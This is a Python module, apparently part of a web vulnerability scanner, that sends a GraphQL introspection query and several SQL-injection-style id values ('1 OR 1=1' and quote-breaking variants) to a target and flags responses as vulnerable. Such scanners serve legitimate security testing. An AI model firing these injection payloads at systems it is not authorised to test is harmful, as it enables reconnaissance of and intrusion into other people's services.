import json

from core.http import fetch

GRAPHQL_PAYLOADS = [
    {'type': 'GraphQL Introspection', 'data': {'query': 'query IntrospectionQuery { __schema { queryType { name } mutationType { name } types { name } } }'}} ,
    {'type': 'GraphQL Injection', 'data': {'query': '{ user(id: "1") { name } }'}},
    {'type': 'GraphQL Injection', 'data': {'query': '{ user(id: "1 OR 1=1") { name } }'}},
    {'type': 'GraphQL Injection', 'data': {'query': '{ user(id: "1\" OR \"1\"=\"1") { name } }'}},
    {'type': 'GraphQL Injection', 'data': {'query': '{ user(id: "1) OR 1=1") { name } }'}},
]

def generate_tasks(url, config):
    tasks = []
    for entry in GRAPHQL_PAYLOADS:
        tasks.append({
            'url': url,
            'method': 'POST',
            'data': entry['data'],
            'type': entry['type'],
            'executor': test_graphql,
        })
    return tasks

async def test_graphql(session, task):
    try:
        text, resp = await fetch(session, task['url'], method='POST', json=task['data'])
        if resp and resp.status == 200 and text:
            try:
                data = json.loads(text)
            except Exception:
                data = {}
            if task['type'] == 'GraphQL Introspection':
                body = str(data)
                vulnerable = (
                    isinstance(data, dict)
                    and data.get('data', {}).get('__schema') is not None
                ) or ('__schema' in body and 'queryType' in body)
            else:
                err = str(data.get('errors', '')).lower() if isinstance(data, dict) else ''
                has_data = isinstance(data, dict) and bool(data.get('data'))
                vulnerable = has_data and 'syntax' not in err and 'invalid' not in err
            return {
                'type': task['type'],
                'url': task['url'],
                'vulnerable': vulnerable,
                'response': str(data)[:1000],
            }
    except Exception as exc:
        return {'type': task['type'], 'url': task['url'], 'error': str(exc), 'vulnerable': False}
    return {'type': task['type'], 'url': task['url'], 'vulnerable': False}